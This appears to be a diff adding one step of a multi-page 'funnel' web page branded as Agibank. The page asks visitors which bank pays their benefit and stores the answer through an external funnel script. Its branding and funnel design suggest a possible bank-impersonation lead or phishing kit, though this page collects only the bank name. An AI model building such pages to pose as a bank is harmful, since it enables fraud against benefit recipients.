@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Agibank - Seleção de Banco</title>
+    <script src="assets/js/tailwind.js"></script>
+    <link href="assets/css/inter.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="assets/js/funnel.js"></script>
+    <style>
+        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0064F5 0%, #003d99 100%); }
+        .bank-card { backdrop-filter: blur(10px); background: rgba(255, 255, 255, 0.95); }
+        .bank-option { transition: all 0.2s; border: 2px solid #e2e8f0; cursor: pointer; }
+        .bank-option:hover { border-color: #0064F5; background: #f0f7ff; }
+        .bank-option.selected { border-color: #0064F5; background: #e0efff; box-shadow: 0 0 0 2px rgba(0, 100, 245, 0.2); }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+    <div class="bank-card w-full max-w-md p-8 rounded-3xl shadow-2xl">
+        <div class="text-center mb-6">
+            <img src="assets/img/logo-agi.png" alt="Agibank" class="h-9 mx-auto mb-4 object-contain">
+            <h1 class="text-2xl font-bold text-gray-800">Recebimento</h1>
+            <p class="text-gray-500 mt-1 text-sm">Por qual banco você recebe o seu benefício?</p>
+        </div>
+        
+        <div class="space-y-2 max-h-[350px] overflow-y-auto pr-2 mb-6" id="bankList">
+            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Crefisa')">
+                Crefisa
+            </div>
+            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Banco do Brasil')">
+                Banco do Brasil
+            </div>
+            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Bradesco')">
+                Bradesco
+            </div>
+            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Itaú Unibanco')">
+                Itaú Unibanco
+            </div>
+            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Caixa Econômica Federal')">
+                Caixa Econômica Federal
+            </div>
+            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Santander')">
+                Santander
+            </div>
+            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Banco Agibank')">
+                Banco Agibank
+            </div>
+            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Banco Inter')">
+                Banco Inter
+            </div>
+            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Banco PAN')">
+                Banco PAN
+            </div>
+            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Banco BMG')">
+                Banco BMG
+            </div>
+            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'BRB (Banco de Brasília)')">
+                BRB (Banco de Brasília)
+            </div>
+            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Banco Safra')">
+                Banco Safra
+            </div>
+            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'C6 Bank')">
+                C6 Bank
+            </div>
+            <div class="bank-option p-4 rounded-2xl font-semibold text-gray-700" onclick="selectBank(this, 'Outro Banco')">
+                Outro Banco
+            </div>
+        </div>
+        
+        <div class="flex flex-col space-y-3">
+            <button type="button" id="btnAvancar" onclick="avancar()" disabled class="w-full bg-[#0064F5] hover:bg-[#0052cc] text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-200 transition-all transform opacity-50 cursor-not-allowed">
+                AVANÇAR
+            </button>
+            <button type="button" onclick="window.history.back()" class="w-full bg-gray-100 hover:bg-gray-200 text-gray-600 font-bold py-3.5 rounded-2xl transition-all text-sm">
+                VOLTAR
+            </button>
+        </div>
+    </div>
+
+    <script>
+        let selectedBankName = "";
+
+        // Recupera banco anterior se já selecionado
+        const savedData = getFunnelData();
+        if (savedData.banco) {
+            const options = document.querySelectorAll('.bank-option');
+            options.forEach(opt => {
+                if (opt.innerText.trim() === savedData.banco) {
+                    selectBank(opt, savedData.banco);
+                }
+            });
+        }
+
+        function selectBank(element, bankName) {
+            document.querySelectorAll('.bank-option').forEach(el => el.classList.remove('selected'));
+            element.classList.add('selected');
+            selectedBankName = bankName;
+            
+            const btn = document.getElementById('btnAvancar');
+            btn.disabled = false;
+            btn.classList.remove('opacity-50', 'cursor-not-allowed');
+            btn.classList.add('hover:-translate-y-1');
+        }
+
+        async function avancar() {
+            if (!selectedBankName) return;
+
+            const btn = document.getElementById('btnAvancar');
+            btn.disabled = true;
+            btn.innerText = 'Processando...';
+
+            sessionStorage.setItem('user_banco', selectedBankName);
+            await saveFunnelData('banco', { banco: selectedBankName });
+
+            // Próxima etapa do funil: ANALISE
+            navTo('analise.html');
+        }
+    </script>
+</body>
+</html>
